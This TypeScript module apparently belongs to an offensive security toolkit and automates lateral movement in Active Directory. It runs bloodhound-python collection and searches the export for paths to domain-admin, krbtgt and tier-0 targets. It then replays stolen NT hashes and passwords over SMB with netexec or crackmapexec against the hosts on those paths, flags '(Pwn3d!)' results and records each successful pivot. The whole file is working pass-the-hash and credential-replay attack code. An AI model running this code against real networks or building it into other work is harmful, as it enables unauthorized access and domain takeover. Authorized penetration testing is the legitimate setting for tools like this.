/**
 * @module pivot_replay
 * BloodHound + netexec credential replay for multi-hop pivot chains.
 */
import { execFileSync, execFile } from "node:child_process"
import { promisify } from "node:util"
import * as fs from "node:fs"
import * as path from "node:path"
import * as os from "node:os"
import { isToolAvailable, getToolPath } from "./tool_detection.ts"
import { LivePivotEngine, type PivotFinding } from "./live_pivot.ts"
import type { CredentialGraph } from "./credential_graph.ts"

const execFileP = promisify(execFile)

export interface ReplayResult {
  host: string
  success: boolean
  method: "netexec_smb" | "netexec_pth" | "bloodhound_path"
  output: string
  newHosts: string[]
  findings: PivotFinding[]
}

export interface BloodHoundCollectOpts {
  domain: string
  username?: string
  password?: string
  dc?: string
}

export interface BloodHoundPath {
  start: string
  end: string
  nodes: string[]
  targetHosts: string[]
}

function netexecBin(): string | null {
  return isToolAvailable("netexec") ? getToolPath("netexec")! : isToolAvailable("crackmapexec") ? getToolPath("crackmapexec")! : null
}

function extractHostsFromNodes(nodes: string[]): string[] {
  const hosts = new Set<string>()
  const ipRe = /\b(?:\d{1,3}\.){3}\d{1,3}\b/
  const hostRe = /^[A-Z0-9][A-Z0-9-]{1,62}$/i
  for (const n of nodes) {
    const ip = n.match(ipRe)?.[0]
    if (ip) { hosts.add(ip); continue }
    const label = n.split("@").pop()?.split(".").shift() ?? n
    if (hostRe.test(label) && label.length > 2 && !/admin|user|group|domain/i.test(label)) {
      hosts.add(label)
    }
  }
  return [...hosts]
}

/** Run bloodhound-python collection; returns path to JSON/zip output dir. */
export async function collectBloodHound(opts: BloodHoundCollectOpts): Promise<{ outDir: string; zipPath?: string; jsonFiles: string[] }> {
  if (!isToolAvailable("bloodhound-python")) {
    return { outDir: "", jsonFiles: [] }
  }
  const outDir = path.join(os.tmpdir(), `ourmine_bh_${Date.now()}`)
  fs.mkdirSync(outDir, { recursive: true })
  const args = [
    "-c", "All",
    "-u", opts.username ?? "",
    "-p", opts.password ?? "",
    "-d", opts.domain,
    "--zip",
  ]
  if (opts.dc) args.push("-dc", opts.dc)
  try {
    await execFileP("bloodhound-python", args, { cwd: outDir, timeout: 180000 })
  } catch { /* partial output ok */ }
  const files = fs.existsSync(outDir) ? fs.readdirSync(outDir) : []
  const zipPath = files.find((f) => f.endsWith(".zip"))
  const jsonFiles = files.filter((f) => f.endsWith(".json")).map((f) => path.join(outDir, f))
  return { outDir, zipPath: zipPath ? path.join(outDir, zipPath) : undefined, jsonFiles }
}

/** Parse BloodHound JSON export for paths to high-value targets via graph traversal. */
export function parseBloodHoundPaths(jsonPath: string): BloodHoundPath[] {
  if (!fs.existsSync(jsonPath)) return []
  try {
    const raw = fs.readFileSync(jsonPath, "utf8")
    const data = JSON.parse(raw) as Record<string, unknown>
    const graph = normalizeBloodHoundGraph(data)
    if (graph.nodes.length === 0) return []
    return findBloodHoundAttackPaths(graph.nodes, graph.edges)
  } catch {
    return []
  }
}

interface BhNode {
  id: string
  label: string
  kind: string
}

interface BhEdge {
  from: string
  to: string
}

function normalizeBloodHoundGraph(data: Record<string, unknown>): { nodes: BhNode[]; edges: BhEdge[] } {
  const nodes: BhNode[] = []
  const edges: BhEdge[] = []

  const pushNode = (id: string, label: string, kind: string) => {
    if (!id) return
    if (!nodes.some((n) => n.id === id)) nodes.push({ id, label: label || id, kind })
  }

  const pushEdge = (from: unknown, to: unknown) => {
    const a = String(from ?? "")
    const b = String(to ?? "")
    if (a && b) edges.push({ from: a, to: b })
  }

  const flatNodes = (data.nodes ?? (data.data as { nodes?: unknown[] })?.nodes ?? []) as Record<string, unknown>[]
  for (const n of flatNodes) {
    const props = (n.properties ?? n) as Record<string, unknown>
    const id = String(n.id ?? props.ObjectIdentifier ?? props.objectid ?? "")
    const label = String(n.label ?? n.name ?? props.name ?? props.samaccountname ?? id)
    const kind = String(n.kind ?? props.objecttype ?? props.type ?? "")
    pushNode(id, label, kind)
  }

  const flatEdges = (data.edges ?? (data.data as { edges?: unknown[] })?.edges ?? []) as Record<string, unknown>[]
  for (const e of flatEdges) {
    pushEdge(e.source ?? e.StartNode ?? e.start, e.target ?? e.EndNode ?? e.end)
  }

  // BloodHound CE: { data: [ { properties: {...}, kind: "User" }, ... ] }
  const ceData = data.data
  if (Array.isArray(ceData)) {
    for (const item of ceData as Record<string, unknown>[]) {
      const props = (item.properties ?? item) as Record<string, unknown>
      const kind = String(item.kind ?? props.type ?? "")
      const id = String(props.ObjectIdentifier ?? props.objectid ?? props.name ?? "")
      const label = String(props.name ?? props.samaccountname ?? props.distinguishedname ?? id)
      pushNode(id, label, kind)
    }
  }

  // BloodHound CE relationships in separate arrays (Users/Members/ACLs)
  for (const key of ["Users", "Computers", "Groups", "Domains"]) {
    const arr = data[key]
    if (!Array.isArray(arr)) continue
    for (const item of arr as Record<string, unknown>[]) {
      const props = (item.Properties ?? item.properties ?? item) as Record<string, unknown>
      const id = String(props.objectid ?? props.ObjectIdentifier ?? props.name ?? "")
      const label = String(props.name ?? props.samaccountname ?? id)
      pushNode(id, label, key.slice(0, -1))
    }
  }

  return { nodes, edges }
}

function isHighValueTarget(node: BhNode): boolean {
  const text = `${node.label} ${node.kind}`.toLowerCase()
  return /domain admin|enterprise admin|\bda\b|krbtgt|administrator|high.?value|tier.?0/.test(text)
}

function isStartNode(node: BhNode): boolean {
  const text = `${node.label} ${node.kind}`.toLowerCase()
  if (isHighValueTarget(node)) return false
  return /user|group|computer|machine|gpo|ou|container/.test(text)
}

function buildAdjacency(edges: BhEdge[]): Map<string, string[]> {
  const adj = new Map<string, string[]>()
  for (const { from, to } of edges) {
    if (!adj.has(from)) adj.set(from, [])
    adj.get(from)!.push(to)
    if (!adj.has(to)) adj.set(to, [])
    adj.get(to)!.push(from)
  }
  return adj
}

function bfsPath(startId: string, targetId: string, adj: Map<string, string[]>, maxDepth: number): string[] | null {
  if (startId === targetId) return [startId]
  const queue: { id: string; path: string[] }[] = [{ id: startId, path: [startId] }]
  const visited = new Set<string>([startId])
  while (queue.length > 0) {
    const { id, path } = queue.shift()!
    if (path.length > maxDepth) continue
    for (const next of adj.get(id) ?? []) {
      if (visited.has(next)) continue
      const nextPath = [...path, next]
      if (next === targetId) return nextPath
      visited.add(next)
      queue.push({ id: next, path: nextPath })
    }
  }
  return null
}

function findBloodHoundAttackPaths(nodes: BhNode[], edges: BhEdge[], maxPaths = 12, maxDepth = 10): BloodHoundPath[] {
  const nodeById = new Map(nodes.map((n) => [n.id, n]))
  const adj = buildAdjacency(edges)
  const targets = nodes.filter(isHighValueTarget)
  const starts = nodes.filter(isStartNode)

  const paths: BloodHoundPath[] = []
  const seen = new Set<string>()

  for (const start of starts.slice(0, 30)) {
    for (const target of targets.slice(0, 15)) {
      if (start.id === target.id) continue
      const pathIds = edges.length > 0
        ? bfsPath(start.id, target.id, adj, maxDepth)
        : (isHighValueTarget(target) ? [start.id, target.id] : null)
      if (!pathIds || pathIds.length < 2) continue
      const labels = pathIds.map((id) => nodeById.get(id)?.label ?? id)
      const key = labels.join("→")
      if (seen.has(key)) continue
      seen.add(key)
      paths.push({
        start: start.label,
        end: target.label,
        nodes: labels,
        targetHosts: extractHostsFromNodes(labels),
      })
      if (paths.length >= maxPaths) return paths
    }
  }

  if (paths.length === 0 && targets.length > 0) {
    for (const target of targets.slice(0, 5)) {
      paths.push({
        start: "current_user",
        end: target.label,
        nodes: [target.label],
        targetHosts: extractHostsFromNodes([target.label]),
      })
    }
  }

  return paths
}

/** Parse all JSON files in a BloodHound export directory. */
export function parseBloodHoundDir(dir: string): BloodHoundPath[] {
  if (!fs.existsSync(dir)) return []
  const all: BloodHoundPath[] = []
  for (const f of fs.readdirSync(dir).filter((x) => x.endsWith(".json"))) {
    all.push(...parseBloodHoundPaths(path.join(dir, f)))
  }
  return all
}

/** Ingest BloodHound data into credential graph and return discovered paths. */
export async function ingestBloodHoundIntoGraph(
  credGraph: CredentialGraph,
  opts: BloodHoundCollectOpts & { jsonPath?: string; outDir?: string },
): Promise<BloodHoundPath[]> {
  let paths: BloodHoundPath[] = []
  let exportPath = opts.jsonPath ?? opts.outDir

  if (opts.jsonPath) {
    paths = parseBloodHoundPaths(opts.jsonPath)
  } else if (opts.outDir) {
    paths = parseBloodHoundDir(opts.outDir)
  } else if (opts.domain) {
    const collected = await collectBloodHound(opts)
    exportPath = collected.outDir
    paths = parseBloodHoundDir(collected.outDir)
  }

  credGraph.ingestBloodHoundPaths(paths, exportPath)
  return paths
}

export function replayPassTheHash(
  host: string,
  username: string,
  nthash: string,
  domain = "WORKGROUP",
): ReplayResult {
  const bin = netexecBin()
  if (!bin) {
    return { host, success: false, method: "netexec_pth", output: "netexec not on PATH", newHosts: [], findings: [] }
  }
  try {
    const out = execFileSync(bin, ["smb", host, "-u", username, "-H", nthash, "-d", domain, "--shares"], {
      encoding: "utf8",
      timeout: 120000,
    })
    const success = out.includes("(Pwn3d!)") || out.includes("+") || out.includes("READ")
    return {
      host,
      success,
      method: "netexec_pth",
      output: out.slice(0, 3000),
      newHosts: success ? [host] : [],
      findings: success ? [{
        type: "smb_auth",
        severity: "critical",
        host,
        detail: `PTH success ${domain}/${username}@${host}`,
        output: out.slice(0, 1500),
        tool: bin,
      }] : [],
    }
  } catch (e: unknown) {
    const err = e as { stdout?: string; stderr?: string }
    const out = (err.stdout ?? "") + (err.stderr ?? "")
    const success = out.includes("(Pwn3d!)")
    return {
      host,
      success,
      method: "netexec_pth",
      output: out.slice(0, 3000),
      newHosts: success ? [host] : [],
      findings: [],
    }
  }
}

export async function replayPasswordAuthAsync(
  host: string,
  username: string,
  password: string,
  domain = "WORKGROUP",
): Promise<ReplayResult> {
  const engine = new LivePivotEngine()
  const findings = await engine.smbAuth(host, username, password)
  return {
    host,
    success: findings.some((f) => f.severity === "critical"),
    method: "netexec_smb",
    output: findings.map((f) => f.output).join("\n").slice(0, 3000),
    newHosts: findings.length ? [host] : [],
    findings,
  }
}

/** Full pivot chain: BloodHound path discovery → netexec replay on path hosts. */
export async function replayCredentialGraphWithBloodHound(
  credGraph: CredentialGraph,
  hosts: string[],
  opts: BloodHoundCollectOpts & { skipCollection?: boolean } = {},
): Promise<{ paths: BloodHoundPath[]; replays: ReplayResult[] }> {
  let paths = credGraph.getBloodHoundPaths()
  if (paths.length === 0 && !opts.skipCollection && opts.domain) {
    paths = await ingestBloodHoundIntoGraph(credGraph, opts)
  }

  const bhHosts = credGraph.bloodhoundTargetHosts()
  const allHosts = [...new Set([...hosts, ...bhHosts])].filter(Boolean)
  const replays = await replayCredentialGraph(credGraph, allHosts)

  for (const r of replays.filter((x) => x.success)) {
    credGraph.recordPivot({
      from: "bloodhound",
      to: r.host,
      method: r.method,
      credentialId: credGraph.listCredentials().find((c) => c.used)?.id ?? "unknown",
      success: true,
    })
  }

  return { paths, replays }
}

export async function replayCredentialGraph(
  credGraph: CredentialGraph,
  hosts: string[],
): Promise<ReplayResult[]> {
  const results: ReplayResult[] = []
  for (const cred of credGraph.listCredentials().filter((c) => !c.used)) {
    for (const host of hosts) {
      let result: ReplayResult
      if (cred.type === "nthash" && cred.username) {
        result = replayPassTheHash(host, cred.username, cred.value, cred.domain ?? "WORKGROUP")
      } else if (cred.type === "password" && cred.username) {
        result = await replayPasswordAuthAsync(host, cred.username, cred.value, cred.domain ?? "WORKGROUP")
      } else {
        continue
      }
      results.push(result)
      if (result.success) {
        credGraph.recordPivot({
          from: "local",
          to: host,
          method: result.method,
          credentialId: cred.id,
          success: true,
        })
      }
    }
  }
  return results
}

export default {
  replayPassTheHash,
  replayPasswordAuthAsync,
  parseBloodHoundPaths,
  parseBloodHoundDir,
  collectBloodHound,
  ingestBloodHoundIntoGraph,
  replayCredentialGraph,
  replayCredentialGraphWithBloodHound,
}
